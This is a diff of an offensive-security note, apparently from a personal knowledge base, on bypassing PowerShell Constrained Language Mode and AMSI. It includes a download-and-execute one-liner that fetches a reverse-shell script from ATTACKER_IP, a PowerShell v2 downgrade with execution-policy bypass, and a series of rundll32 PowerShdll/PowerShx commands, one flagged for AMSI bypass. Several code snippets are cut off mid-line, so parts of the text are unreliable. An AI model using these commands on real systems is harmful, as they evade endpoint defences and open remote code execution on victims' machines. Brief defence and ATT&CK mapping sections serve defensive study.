@@ -49,11 +49,15 @@ Technical Explanation: The attacker uses Powershell DLL Runner to load a malicio
 
 Business Value: This technique allows an attacker to bypass security controls and execute arbitrary code in a Powershell session that has CLM enabled. This can be used to achieve persistence on a compromised system, exfiltrate data, or execute other malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to a system with Powershell installed
 
 1. Powershell DLL Runner tool
+
+ 
 
 ## Defense
 
@@ -63,20 +67,32 @@ Business Value: This technique allows an attacker to bypass security controls an
 
 1. Implement strict execution policies for Powershell scripts
 
+ 
+
 ## Objectives
 
 1. Bypass Constrained Language Mode in a Powershell session
 
 1. Execute arbitrary code in a Powershell session that has CLM enabled
 
+ 
+
 # Instructions
 
 1. To execute this command, open a PowerShell terminal and copy-paste the command into the terminal.
 
+ 
+
+
+
 **Code**: [[powershell.exe -version 2
 powershell.exe -version ]]
 
+
+
 > This command can be used to bypass certain security measures that are in place on newer versions of PowerShell. The command uses PowerShell v2, which doesn't support Constrained Language Mode (CLM), a security feature that restricts the use of certain PowerShell commands and functions. The 'data' field contains multiple commands that can be executed in a PowerShell terminal. The 'name' field describes the purpose of the command, which is to bypass security measures. The 'instruction' field provides guidance on how to execute the command, and the 'explain' field provides additional information on the purpose and functionality of the command.
+
+
 
 **Command** ([[Download and execute PowerShell script]]):
 
@@ -84,22 +100,38 @@ powershell.exe -version ]]
 powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
 ```
 
+
+
 2. To bypass CLM using System32 path, follow the below instructions:
 1. Enable CLM from the environment.
 2. Create a check-mode.ps1 containing your "evil" powershell commands.
 3. Execute the powershell script inside a System32 folder.
 
+ 
+
+
+
 **Code**: [[# Enable CLM from the environment
 [Environment]::S]]
+
+
 
 > CLM or Constrained Language Mode is a security feature in PowerShell that restricts the usage of certain PowerShell commands and functions. However, this can be bypassed by using the System32 path. By executing the PowerShell script inside a System32 folder, the PowerShell interpreter assumes that the script is a trusted Microsoft binary and allows it to run in FullLanguage mode instead of ConstrainedLanguage mode.
 
 3. This command allows you to use your own Powershell DLL to execute scripts or start an interactive console. The -f argument is used to specify the path of the script to be executed. The -w argument starts an interactive console in a new window, while -i starts an interactive console in the current window. The -s argument is used to attempt to bypass AMSI. The -v argument prints execution output to the console.
 
+ 
+
+
+
 **Code**: [[rundll32 PowerShdll,main <script>
 rundll32 PowerSh]]
 
+
+
 > To use this command, first download the Powershell DLLs from the provided links. Then, use the rundll32 command followed by the path to the DLL and the desired arguments. For example, to run a script using PowerShdll, use the command 'rundll32 PowerShdll,main -f C:\path\to\script.ps1'. To start an interactive console using PowerShx, use the command 'rundll32 PowerShx.dll,main -w'. Note that the -s argument may not always successfully bypass AMSI.
+
+
 
 **Command** ([[PowerShdll Script Execution]]):
 
@@ -107,11 +139,19 @@ rundll32 PowerSh]]
 rundll32 PowerShdll,main <script>
 ```
 
+
+
+
+
 **Command** ([[PowerShdll Help]]):
 
 ```bash
 rundll32 PowerShdll,main -h
 ```
+
+
+
+
 
 **Command** ([[PowerShdll Script Execution]]):
 
@@ -119,11 +159,19 @@ rundll32 PowerShdll,main -h
 rundll32 PowerShdll,main -f <path>
 ```
 
+
+
+
+
 **Command** ([[PowerShdll Interactive Console]]):
 
 ```bash
 rundll32 PowerShdll,main -w
 ```
+
+
+
+
 
 **Command** ([[PowerShdll Interactive Console]]):
 
@@ -131,11 +179,19 @@ rundll32 PowerShdll,main -w
 rundll32 PowerShdll,main -i
 ```
 
+
+
+
+
 **Command** ([[PowerShx Script Execution]]):
 
 ```bash
 rundll32 PowerShx.dll,main -e <PS script to run>
 ```
+
+
+
+
 
 **Command** ([[PowerShx Script Execution]]):
 
@@ -143,11 +199,19 @@ rundll32 PowerShx.dll,main -e <PS script to run>
 rundll32 PowerShx.dll,main -f <path>
 ```
 
+
+
+
+
 **Command** ([[PowerShx Script Execution with Cmdlet]]):
 
 ```bash
 rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>
 ```
+
+
+
+
 
 **Command** ([[PowerShx Interactive Console]]):
 
@@ -155,11 +219,19 @@ rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>
 rundll32 PowerShx.dll,main -w
 ```
 
+
+
+
+
 **Command** ([[PowerShx Interactive Console]]):
 
 ```bash
 rundll32 PowerShx.dll,main -i
 ```
+
+
+
+
 
 **Command** ([[PowerShx Attempt to Bypass AMSI]]):
 
@@ -167,11 +239,17 @@ rundll32 PowerShx.dll,main -i
 rundll32 PowerShx.dll,main -s
 ```
 
+
+
+
+
 **Command** ([[PowerShx Print Execution Output]]):
 
 ```bash
 rundll32 PowerShx.dll,main -v
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -207,3 +285,5 @@ rundll32 PowerShx.dll,main -v
 - [[Constrained Language Mode]]
 - [[Powershell]]
 - [[Windows - Defenses]]
+
+
